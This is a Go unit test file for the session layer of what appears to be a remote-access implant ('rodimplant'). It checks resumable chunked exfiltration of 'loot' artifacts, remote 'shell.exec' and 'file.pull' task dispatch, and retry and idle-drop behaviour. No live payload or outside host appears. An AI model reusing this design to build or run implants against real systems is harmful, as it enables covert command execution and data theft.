package session

import (
	"testing"

	"rodimplant/internal/wire"

	"google.golang.org/protobuf/proto"
)

func newSession() *Session {
	return New("id-1", []string{"shell.exec", "file.pull"}, 1, 0, "", nil,
		map[string]Handler{
			"shell.exec": func(string) (wire.TaskOutcome, string, *Artifact) {
				return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "ran", nil
			},
		})
}

func TestExfilRunSlicesUnderBudgetAndResumesFromReports(t *testing.T) {
	s := newSession()
	data := make([]byte, ExfilChunkBytes*2+100)
	for i := range data {
		data[i] = byte(i)
	}
	s.queueResult("t-1", wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "streamed", &Artifact{
		Name: "loot.bin", ContentType: "application/octet-stream", Data: data,
	})

	first := s.ExfilFrames(ExfilChunkBytes * 2)
	if len(first) != 2 {
		t.Fatalf("budget of two chunks must carry exactly two slices, got %d", len(first))
	}
	var a, b wire.ExfilChunk
	mustUnframe(t, first[0], &a)
	mustUnframe(t, first[1], &b)
	if a.Offset == nil || *a.Offset != 0 {
		t.Fatal("the first slice carries offset 0")
	}
	if b.Offset == nil || *b.Offset != ExfilChunkBytes {
		t.Fatal("the second slice carries its absolute offset")
	}
	if a.Terminal || b.Terminal {
		t.Fatal("no slice before the run's end is terminal")
	}
	if len(a.PayloadSha256) != 32 {
		t.Fatal("every slice declares the whole run's hash")
	}

	// A report for the first chunk only: the next contact serves from the
	// seam, not from zero, and the terminal slice lands with the tail.
	s.ApplyExfilProgress("t-1", "loot.bin", ExfilChunkBytes)
	second := s.ExfilFrames(ExfilContactBudget)
	if len(second) != 2 {
		t.Fatalf("the remainder is the tail's two slices, got %d", len(second))
	}
	var c, d wire.ExfilChunk
	mustUnframe(t, second[0], &c)
	mustUnframe(t, second[1], &d)
	if c.Offset == nil || *c.Offset != ExfilChunkBytes {
		t.Fatal("a resumed contact serves from the confirmed seam")
	}
	if !d.Terminal {
		t.Fatal("the run's last slice is terminal")
	}

	// The end-of-run report retires the run: nothing left to serve.
	s.ApplyExfilProgress("t-1", "loot.bin", uint64(len(data)))
	if s.ExfilPending() {
		t.Fatal("a report covering the run whole retires it")
	}
}

func TestExfilReportRewindsTheSeam(t *testing.T) {
	s := newSession()
	data := make([]byte, ExfilChunkBytes+10)
	s.queueResult("t-2", wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "streamed", &Artifact{
		Name: "rewind.bin", ContentType: "application/octet-stream", Data: data,
	})
	s.ApplyExfilProgress("t-2", "rewind.bin", ExfilChunkBytes)
	// A restarted server rewinds to zero: the sender re-serves whole.
	s.ApplyExfilProgress("t-2", "rewind.bin", 0)
	frames := s.ExfilFrames(ExfilContactBudget)
	var first wire.ExfilChunk
	mustUnframe(t, frames[0], &first)
	if first.Offset == nil || *first.Offset != 0 {
		t.Fatal("a rewound report re-serves from zero")
	}
}

func TestIdleRunsDropPastTheBound(t *testing.T) {
	s := newSession()
	s.queueResult("t-3", wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "streamed", &Artifact{
		Name: "lost.bin", ContentType: "application/octet-stream", Data: []byte{1, 2, 3},
	})
	for cycle := 0; cycle < exfilIdleCycles; cycle++ {
		_ = s.ExfilFrames(ExfilContactBudget)
		s.ExfilCycleEnd()
	}
	if s.ExfilPending() {
		t.Fatal("a run the server never reports on drops past the idle bound")
	}
}

func TestProgressRunSurvivesIdleCycles(t *testing.T) {
	s := newSession()
	data := make([]byte, ExfilChunkBytes*3)
	s.queueResult("t-4", wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, "streamed", &Artifact{
		Name: "slow.bin", ContentType: "application/octet-stream", Data: data,
	})
	for cycle := 0; cycle < exfilIdleCycles+2; cycle++ {
		_ = s.ExfilFrames(ExfilChunkBytes)
		s.ApplyExfilProgress("t-4", "slow.bin", uint64((cycle+1)*ExfilChunkBytes))
		s.ExfilCycleEnd()
		if !s.ExfilPending() && cycle < 2 {
			t.Fatalf("a progressing run must survive, dropped at cycle %d", cycle)
		}
	}
	if s.ExfilPending() {
		t.Fatal("a fully reported run retires")
	}
}

func TestRedeliveredTaskAnswersFromCache(t *testing.T) {
	s := newSession()
	s.Dispatch(&wire.TaskRequest{TaskId: "t-9", Verb: "shell.exec"})
	if len(s.Batch()) != 1 {
		t.Fatal("the dispatched task queued its result")
	}
	s.BatchCrossed()
	s.Dispatch(&wire.TaskRequest{TaskId: "t-9", Verb: "shell.exec"})
	if len(s.Batch()) != 1 {
		t.Fatal("a redelivered task re-answers from the cache")
	}
}

func TestUnknownVerbFails(t *testing.T) {
	s := newSession()
	s.Dispatch(&wire.TaskRequest{TaskId: "t-10", Verb: "fs.list"})
	frames := s.Batch()
	if len(frames) != 1 {
		t.Fatal("an unknown verb reports a result")
	}
	var result wire.TaskResult
	mustUnframe(t, frames[0], &result)
	if result.Outcome != wire.TaskOutcome_TASK_OUTCOME_FAILED {
		t.Fatal("an unknown verb fails, never panics")
	}
}

func mustUnframe(t *testing.T, f *wire.Frame, into proto.Message) {
	t.Helper()
	if err := proto.Unmarshal(f.Payload, into); err != nil {
		t.Fatalf("frame did not parse: %v", err)
	}
}

func TestAdvertisedVerbsIntersectCompiledHandlers(t *testing.T) {
	s := newSession()
	// The bake named shell.exec and file.pull; only shell.exec compiled.
	if len(s.Advertised) != 1 || s.Advertised[0] != "shell.exec" {
		t.Fatalf("advertised verbs must intersect the compiled set, got %v", s.Advertised)
	}
}
